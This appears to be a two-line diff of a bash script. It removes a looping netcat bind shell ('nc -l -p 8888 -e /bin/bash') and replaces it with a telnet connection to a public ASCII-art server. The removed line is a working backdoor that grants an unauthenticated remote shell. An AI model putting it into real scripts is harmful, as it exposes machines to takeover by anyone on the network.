@@ -1,2 +1,2 @@
 #!/bin/bash
-while true; do nc -l -p 8888 -e /bin/bash; done
+telnet towel.blinkenlights.nl
